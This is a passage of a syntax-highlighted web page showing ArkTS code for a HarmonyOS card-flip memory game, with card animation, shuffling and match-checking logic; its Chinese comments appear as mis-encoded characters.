¼ç±»</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">value</span>: string; <span class="comment">// å•å…ƒæ ¼çš„å€¼ï¼Œå³å¡ç‰‡ä¸Šçš„å›¾æ¡ˆ</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">isVisible</span>: boolean = <span class="literal">false</span>; <span class="comment">// æ§åˆ¶å¡ç‰‡æ˜¯å¦å¯è§</span></span><br><span class="line">  <span class="attr">isFrontVisible</span>: boolean = <span class="literal">false</span>; <span class="comment">// æ§åˆ¶å¡ç‰‡æ˜¯å¦æ­£é¢æœä¸Š</span></span><br><span class="line">  <span class="attr">isMatched</span>: boolean = <span class="literal">false</span>; <span class="comment">// æ ‡è®°å¡ç‰‡æ˜¯å¦å·²è¢«åŒ¹é…</span></span><br><span class="line">  <span class="attr">isAnimationRunning</span>: boolean = <span class="literal">false</span>; <span class="comment">// åŠ¨ç”»æ˜¯å¦æ­£åœ¨è¿è¡Œ</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">rotationAngle</span>: number = <span class="number">0</span>; <span class="comment">// å¡ç‰‡çš„æ—‹è½¬è§’åº¦</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">value: string</span>) &#123; <span class="comment">// æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–å•å…ƒæ ¼</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">value</span> = value; <span class="comment">// è®¾ç½®å•å…ƒæ ¼çš„å€¼</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å±•ç¤ºå¡ç‰‡æ­£é¢çš„æ–¹æ³•</span></span><br><span class="line">  <span class="title function_">revealFace</span>(<span class="params">animationTime: number, callback?: () =&gt; <span class="keyword">void</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAnimationRunning</span>) &#123; <span class="comment">// å¦‚æœå·²ç»æœ‰åŠ¨ç”»åœ¨è¿è¡Œï¼Œåˆ™è¿”å›</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">true</span>; <span class="comment">// è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºè¿è¡Œä¸­</span></span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123; <span class="comment">// å¼€å§‹åŠ¨ç”»</span></span><br><span class="line">      <span class="attr">duration</span>: animationTime, <span class="comment">// åŠ¨ç”»æŒç»­æ—¶é—´</span></span><br><span class="line">      <span class="attr">iterations</span>: <span class="number">1</span>, <span class="comment">// åŠ¨ç”»è¿­ä»£æ¬¡æ•°</span></span><br><span class="line">      <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">Linear</span>, <span class="comment">// åŠ¨ç”»æ›²çº¿ç±»å‹</span></span><br><span class="line">      <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å®Œæˆåçš„å›è°ƒ</span></span><br><span class="line">        <span class="title function_">animateToImmediately</span>(&#123; <span class="comment">// å†æ¬¡å¼€å§‹åŠ¨ç”»</span></span><br><span class="line">          <span class="attr">duration</span>: animationTime, <span class="comment">// åŠ¨ç”»æŒç»­æ—¶é—´</span></span><br><span class="line">          <span class="attr">iterations</span>: <span class="number">1</span>, <span class="comment">// åŠ¨ç”»è¿­ä»£æ¬¡æ•°</span></span><br><span class="line">          <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">Linear</span>, <span class="comment">// åŠ¨ç”»æ›²çº¿ç±»å‹</span></span><br><span class="line">          <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å®Œæˆåçš„å›è°ƒ</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isFrontVisible</span> = <span class="literal">true</span>; <span class="comment">// è®¾ç½®å¡ç‰‡ä¸ºæ­£é¢æœä¸Š</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span>; <span class="comment">// è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºåœæ­¢</span></span><br><span class="line">            <span class="keyword">if</span> (callback) &#123; <span class="comment">// å¦‚æœæœ‰å›è°ƒå‡½æ•°ï¼Œåˆ™æ‰§è¡Œ</span></span><br><span class="line">              <span class="title function_">callback</span>();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;, <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å¼€å§‹æ—¶çš„å›è°ƒ</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">isVisible</span> = <span class="literal">true</span>; <span class="comment">// è®¾ç½®å¡ç‰‡ä¸ºå¯è§</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">0</span>; <span class="comment">// è®¾ç½®æ—‹è½¬è§’åº¦ä¸º0</span></span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å¼€å§‹æ—¶çš„å›è°ƒ</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">isVisible</span> = <span class="literal">false</span>; <span class="comment">// è®¾ç½®å¡ç‰‡ä¸ºä¸å¯è§</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">90</span>; <span class="comment">// è®¾ç½®æ—‹è½¬è§’åº¦ä¸º90åº¦</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// é‡ç½®å¡ç‰‡çŠ¶æ€çš„æ–¹æ³•</span></span><br><span class="line">  <span class="title function_">reset</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVisible</span> = <span class="literal">false</span>; <span class="comment">// è®¾ç½®å¡ç‰‡ä¸ºä¸å¯è§</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">180</span>; <span class="comment">// è®¾ç½®æ—‹è½¬è§’åº¦ä¸º180åº¦</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isFrontVisible</span> = <span class="literal">false</span>; <span class="comment">// è®¾ç½®å¡ç‰‡ä¸ºèƒŒé¢æœä¸Š</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span>; <span class="comment">// è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºåœæ­¢</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isMatched</span> = <span class="literal">false</span>; <span class="comment">// è®¾ç½®å¡ç‰‡ä¸ºæœªåŒ¹é…</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// éšè—å¡ç‰‡æ­£é¢çš„æ–¹æ³•</span></span><br><span class="line">  <span class="title function_">hideFace</span>(<span class="params">animationTime: number, callback?: () =&gt; <span class="keyword">void</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isAnimationRunning</span>) &#123; <span class="comment">// å¦‚æœå·²ç»æœ‰åŠ¨ç”»åœ¨è¿è¡Œï¼Œåˆ™è¿”å›</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">true</span>; <span class="comment">// è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºè¿è¡Œä¸­</span></span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123; <span class="comment">// å¼€å§‹åŠ¨ç”»</span></span><br><span class="line">      <span class="attr">duration</span>: animationTime, <span class="comment">// åŠ¨ç”»æŒç»­æ—¶é—´</span></span><br><span class="line">      <span class="attr">iterations</span>: <span class="number">1</span>, <span class="comment">// åŠ¨ç”»è¿­ä»£æ¬¡æ•°</span></span><br><span class="line">      <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">Linear</span>, <span class="comment">// åŠ¨ç”»æ›²çº¿ç±»å‹</span></span><br><span class="line">      <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å®Œæˆåçš„å›è°ƒ</span></span><br><span class="line">        <span class="title function_">animateToImmediately</span>(&#123; <span class="comment">// å†æ¬¡å¼€å§‹åŠ¨ç”»</span></span><br><span class="line">          <span class="attr">duration</span>: animationTime, <span class="comment">// åŠ¨ç”»æŒç»­æ—¶é—´</span></span><br><span class="line">          <span class="attr">iterations</span>: <span class="number">1</span>, <span class="comment">// åŠ¨ç”»è¿­ä»£æ¬¡æ•°</span></span><br><span class="line">          <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">Linear</span>, <span class="comment">// åŠ¨ç”»æ›²çº¿ç±»å‹</span></span><br><span class="line">          <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å®Œæˆåçš„å›è°ƒ</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isFrontVisible</span> = <span class="literal">false</span>; <span class="comment">// è®¾ç½®å¡ç‰‡ä¸ºèƒŒé¢æœä¸Š</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">isAnimationRunning</span> = <span class="literal">false</span>; <span class="comment">// è®¾ç½®åŠ¨ç”»çŠ¶æ€ä¸ºåœæ­¢</span></span><br><span class="line">            <span class="keyword">if</span> (callback) &#123; <span class="comment">// å¦‚æœæœ‰å›è°ƒå‡½æ•°ï¼Œåˆ™æ‰§è¡Œ</span></span><br><span class="line">              <span class="title function_">callback</span>();</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;, <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å¼€å§‹æ—¶çš„å›è°ƒ</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">isVisible</span> = <span class="literal">false</span>; <span class="comment">// è®¾ç½®å¡ç‰‡ä¸ºä¸å¯è§</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">180</span>; <span class="comment">// è®¾ç½®æ—‹è½¬è§’åº¦ä¸º180åº¦</span></span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123; <span class="comment">// åŠ¨ç”»å¼€å§‹æ—¶çš„å›è°ƒ</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">isVisible</span> = <span class="literal">true</span>; <span class="comment">// è®¾ç½®å¡ç‰‡ä¸ºå¯è§</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">rotationAngle</span> = <span class="number">90</span>; <span class="comment">// è®¾ç½®æ—‹è½¬è§’åº¦ä¸º90åº¦</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ç»„ä»¶å…¥å£</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">MemoryGame</span> &#123; <span class="comment">// å®šä¹‰æ¸¸æˆç»„ä»¶</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">gameCells</span>: <span class="title class_">GameCell</span>[] = []; <span class="comment">// å­˜å‚¨æ¸¸æˆä¸­çš„æ‰€æœ‰å•å…ƒæ ¼</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cellSize</span>: number = <span class="number">150</span>; <span class="comment">// å•å…ƒæ ¼çš„å¤§å°</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cellSpacing</span>: number = <span class="number">5</span>; <span class="comment">// å•å…ƒæ ¼ä¹‹é—´çš„é—´è·</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">transitionDuration</span>: number = <span class="number">150</span>; <span class="comment">// è¿‡æ¸¡åŠ¨ç”»çš„æŒç»­æ—¶é—´</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">firstSelectedIndex</span>: number | <span class="literal">null</span> = <span class="literal">null</span>; <span class="comment">// è®°å½•ç¬¬ä¸€æ¬¡é€‰æ‹©çš„å¡ç‰‡ç´¢å¼•</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">secondSelectedIndex</span>: number | <span class="literal">null</span> = <span class="literal">null</span>; <span class="comment">// è®°å½•ç¬¬äºŒæ¬¡é€‰æ‹©çš„å¡ç‰‡ç´¢å¼•</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">isGameOver</span>: boolean = <span class="literal">false</span>; <span class="comment">// æ¸¸æˆæ˜¯å¦ç»“æŸ</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">startTime</span>: number = <span class="number">0</span>; <span class="comment">// æ¸¸æˆå¼€å§‹æ—¶é—´</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123; <span class="comment">// ç»„ä»¶å³å°†æ˜¾ç¤ºæ—¶è§¦å‘</span></span><br><span class="line">    <span class="keyword">let</span> <span class="attr">cardValues</span>: string[] = [<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;F&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;H&quot;</span>]; <span class="comment">// å®šä¹‰å¡ç‰‡çš„å€¼</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> cardValues) &#123; <span class="comment">// éå†å¡ç‰‡å€¼</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCells</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">GameCell</span>(value)); <span class="comment">// æ·»åŠ åˆ°æ¸¸æˆå•å…ƒæ ¼æ•°ç»„ä¸­</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCells</span>.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">GameCell</span>(value)); <span class="comment">// æ¯ä¸ªå€¼æ·»åŠ ä¸¤æ¬¡ä»¥å½¢æˆå¯¹</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">shuffleCards</span>(); <span class="comment">// æ´—ç‰Œ</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ´—ç‰Œæ–¹æ³•</span></span><br><span class="line">  <span class="title function_">shuffleCards</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span> = <span class="literal">null</span>; <span class="comment">// æ¸…é™¤ç¬¬ä¸€æ¬¡é€‰æ‹©ç´¢å¼•</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">secondSelectedIndex</span> = <span class="literal">null</span>; <span class="comment">// æ¸…é™¤ç¬¬äºŒæ¬¡é€‰æ‹©ç´¢å¼•</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isGameOver</span> = <span class="literal">false</span>; <span class="comment">// æ¸¸æˆæœªç»“æŸ</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">startTime</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>(); <span class="comment">// è®¾ç½®æ¸¸æˆå¼€å§‹æ—¶é—´ä¸ºå½“å‰æ—¶é—´</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123; <span class="comment">// é‡ç½®æ‰€æœ‰å•å…ƒæ ¼çŠ¶æ€</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCells</span>[i].<span class="title function_">reset</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="variable language_">this</span>.<span class="property">gameCells</span>.<span class="property">length</span> - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123; <span class="comment">// æ´—ç‰Œç®—æ³•</span></span><br><span class="line">      <span class="keyword">const</span> randomIndex = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (i + <span class="number">1</span>)); <span class="comment">// éšæœºç´¢å¼•</span></span><br><span class="line">      <span class="keyword">let</span> tempValue = <span class="variable language_">this</span>.<span class="property">gameCells</span>[i].<span class="property">value</span>; <span class="comment">// ä¸´æ—¶ä¿å­˜å€¼</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCells</span>[i].<span class="property">value</span> = <span class="variable language_">this</span>.<span class="property">gameCells</span>[randomIndex].<span class="property">value</span>; <span class="comment">// äº¤æ¢å€¼</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCells</span>[randomIndex].<span class="property">value</span> = tempValue; <span class="comment">// äº¤æ¢å€¼</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ£€æŸ¥å¡ç‰‡æ˜¯å¦åŒ¹é…çš„æ–¹æ³•</span></span><br><span class="line">  <span class="title function_">checkForMatch</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span> !== <span class="literal">null</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">secondSelectedIndex</span> !== <span class="literal">null</span>) &#123; <span class="comment">// ç¡®ä¿ä¸¤ä¸ªç´¢å¼•éƒ½ä¸ä¸ºç©º</span></span><br><span class="line">      <span class="keyword">const</span> firstCell = <span class="variable language_">this</span>.<span class="property">gameCells</span>[<span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span>]; <span class="comment">// è·å–ç¬¬ä¸€ä¸ªé€‰ä¸­çš„å•å…ƒæ ¼</span></span><br><span class="line">      <span class="keyword">const</span> secondCell = <span class="variable language_">this</span>.<span class="property">gameCells</span>[<span class="variable language_">this</span>.<span class="property">secondSelectedIndex</span>]; <span class="comment">// è·å–ç¬¬äºŒä¸ªé€‰ä¸­çš„å•å…ƒæ ¼</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (firstCell.<span class="property">value</span> === secondCell.<span class="property">value</span>) &#123; <span class="comment">// å¦‚æœä¸¤ä¸ªå•å…ƒæ ¼çš„å€¼ç›¸åŒ</span></span><br><span class="line">        firstCell.<span class="property">isMatched</span> = <span class="literal">true</span>; <span class="comment">// æ ‡è®°ä¸ºå·²åŒ¹é…</span></span><br><span class="line">        secondCell.<span class="property">isMatched</span> = <span class="literal">true</span>; <span class="comment">// æ ‡è®°ä¸ºå·²åŒ¹é…</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span> = <span class="literal">null</span>; <span class="comment">// æ¸…é™¤ç¬¬ä¸€æ¬¡é€‰æ‹©ç´¢å¼•</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">secondSelectedIndex</span> = <span class="literal">null</span>; <span class="comment">// æ¸…é™¤ç¬¬äºŒæ¬¡é€‰æ‹©ç´¢å¼•</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">gameCells</span>.<span class="title function_">every</span>(<span class="function"><span class="params">cell</span> =&gt;</span> cell.<span class="property">isMatched</span>)) &#123; <span class="comment">// å¦‚æœæ‰€æœ‰å•å…ƒæ ¼éƒ½å·²åŒ¹é…</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">isGameOver</span> = <span class="literal">true</span>; <span class="comment">// æ¸¸æˆç»“æŸ</span></span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;æ¸¸æˆç»“æŸ&quot;</span>); <span class="comment">// æ‰“å°ä¿¡æ¯</span></span><br><span class="line">          promptAction.<span class="title function_">showDialog</span>(&#123; <span class="comment">// æ˜¾ç¤ºå¯¹è¯æ¡†</span></span><br><span class="line">            <span class="attr">title</span>: <span class="string">&#x27;æ¸¸æˆèƒœåˆ©ï¼&#x27;</span>, <span class="comment">// å¯¹è¯æ¡†æ ‡é¢˜</span></span><br><span class="line">            <span class="attr">message</span>: <span class="string">&#x27;æ­å–œä½ ï¼Œç”¨æ—¶ï¼š&#x27;</span> + ((<span class="title class_">Date</span>.<span class="title function_">now</span>() - <span class="variable language_">this</span>.<span class="property">startTime</span>) / <span class="number">1000</span>).<span class="title function_">toFixed</span>(<span class="number">3</span>) + <span class="string">&#x27;ç§’&#x27;</span>, <span class="comment">// å¯¹è¯æ¡†æ¶ˆæ¯</span></span><br><span class="line">            <span class="attr">buttons</span>: [&#123; <span class="attr">text</span>: <span class="string">&#x27;é‡æ–°å¼€å§‹&#x27;</span>, <span class="attr">color</span>: <span class="string">&#x27;#ffa500&#x27;</span> &#125;] <span class="comment">// å¯¹è¯æ¡†æŒ‰é’®</span></span><br><span class="line">          &#125;).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// å¯¹è¯æ¡†å…³é—­åæ‰§è¡Œ</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">shuffleCards</span>(); <span class="comment">// é‡æ–°å¼€å§‹æ¸¸æˆ</span></span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; <span class="comment">// å¦‚æœä¸¤ä¸ªå•å…ƒæ ¼çš„å€¼ä¸åŒ</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// å»¶è¿Ÿä¸€æ®µæ—¶é—´å</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span> !== <span class="literal">null</span>) &#123; <span class="comment">// å¦‚æœç¬¬ä¸€ä¸ªç´¢å¼•ä¸ä¸ºç©º</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">gameCells</span>[<span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span>].<span class="title function_">hideFace</span>(<span class="variable language_">this</span>.<span class="property">transitionDuration</span>, <span class="function">() =&gt;</span> &#123; <span class="comment">// éšè—å¡ç‰‡</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span> = <span class="literal">null</span>; <span class="comment">// æ¸…é™¤ç¬¬ä¸€æ¬¡é€‰æ‹©ç´¢å¼•</span></span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">secondSelectedIndex</span> !== <span class="literal">null</span>) &#123; <span class="comment">// å¦‚æœç¬¬äºŒä¸ªç´¢å¼•ä¸ä¸ºç©º</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">gameCells</span>[<span class="variable language_">this</span>.<span class="property">secondSelectedIndex</span>].<span class="title function_">hideFace</span>(<span class="variable language_">this</span>.<span class="property">transitionDuration</span>, <span class="function">() =&gt;</span> &#123; <span class="comment">// éšè—å¡ç‰‡</span></span><br><span class="line">              <span class="variable language_">this</span>.<span class="property">secondSelectedIndex</span> = <span class="literal">null</span>; <span class="comment">// æ¸…é™¤ç¬¬äºŒæ¬¡é€‰æ‹©ç´¢å¼•</span></span><br><span class="line">            &#125;);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;, <span class="number">400</span>); <span class="comment">// å»¶è¿Ÿæ—¶é—´</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ„å»ºæ¸¸æˆç•Œé¢çš„æ–¹æ³•</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">20</span> &#125;) &#123; <span class="comment">// åˆ›å»ºä¸€ä¸ªå‚ç›´å¸ƒå±€</span></span><br><span class="line">      <span class="title class_">Flex</span>(&#123; <span class="attr">wrap</span>: <span class="title class_">FlexWrap</span>.<span class="property">Wrap</span> &#125;) &#123; <span class="comment">// åˆ›å»ºä¸€ä¸ªå¯æ¢è¡Œçš„å¼¹æ€§å¸ƒå±€</span></span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">gameCells</span>, <span class="function">(<span class="params">gameCell: GameCell, index: number</span>) =&gt;</span> &#123; <span class="comment">// éå†æ¸¸æˆå•å…ƒæ ¼</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;gameCell.isVisible ? gameCell.value : <span class="string">&#x27;&#x27;</span>&#125;</span>`</span>) <span class="comment">// æ˜¾ç¤ºå•å…ƒæ ¼çš„å€¼æˆ–ç©ºå­—ç¬¦ä¸²</span></span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">            .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSpacing&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®è¾¹è·</span></span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>) <span class="comment">// è®¾ç½®å­—ä½“å¤§å°</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>) <span class="comment">// æ–‡æœ¬å±…ä¸­</span></span><br><span class="line">            .<span class="title function_">backgroundColor</span>(gameCell.<span class="property">isVisible</span> ? <span class="title class_">Color</span>.<span class="property">Orange</span> : <span class="title class_">Color</span>.<span class="property">Gray</span>) <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>) <span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="number">5</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">            .<span class="title function_">rotate</span>(&#123; <span class="comment">// è®¾ç½®æ—‹è½¬</span></span><br><span class="line">              <span class="attr">x</span>: <span class="number">0</span>,</span><br><span class="line">              <span class="attr">y</span>: <span class="number">1</span>,</span><br><span class="line">              <span class="attr">z</span>: <span class="number">0</span>,</span><br><span class="line">              <span class="attr">angle</span>: gameCell.<span class="property">rotationAngle</span>, <span class="comment">// æ—‹è½¬è§’åº¦</span></span><br><span class="line">              <span class="attr">centerX</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>, <span class="comment">// ä¸­å¿ƒç‚¹Xåæ ‡</span></span><br><span class="line">              <span class="attr">centerY</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cellSize / <span class="number">2</span>&#125;</span>lpx`</span>, <span class="comment">// ä¸­å¿ƒç‚¹Yåæ ‡</span></span><br><span class="line">            &#125;)</span><br><span class="line">            .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// å•å‡»äº‹ä»¶å¤„ç†</span></span><br><span class="line">              <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">isGameOver</span>) &#123; <span class="comment">// å¦‚æœæ¸¸æˆå·²ç»“æŸ</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;æ¸¸æˆå·²ç»“æŸ&quot;</span>); <span class="comment">// æ‰“å°ä¿¡æ¯</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (gameCell.<span class="property">isMatched</span>) &#123; <span class="comment">// å¦‚æœå•å…ƒæ ¼å·²åŒ¹é…</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;å½“å‰å·²æ ‡è®°&quot;</span>); <span class="comment">// æ‰“å°ä¿¡æ¯</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span> == <span class="literal">null</span>) &#123; <span class="comment">// å¦‚æœæ²¡æœ‰ç¬¬ä¸€æ¬¡é€‰æ‹©</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span> = index; <span class="comment">// è®¾ç½®ç¬¬ä¸€æ¬¡é€‰æ‹©ç´¢å¼•</span></span><br><span class="line">                <span class="keyword">if</span> (!gameCell.<span class="property">isFrontVisible</span>) &#123; <span class="comment">// å¦‚æœä¸æ˜¯æ­£é¢æœä¸Š</span></span><br><span class="line">                  gameCell.<span class="title function_">revealFace</span>(<span class="variable language_">this</span>.<span class="property">transitionDuration</span>); <span class="comment">// å±•ç¤ºæ­£é¢</span></span><br><span class="line">                &#125;</span><br><span class="line">              &#125; <span class="keyword">else</span> <span 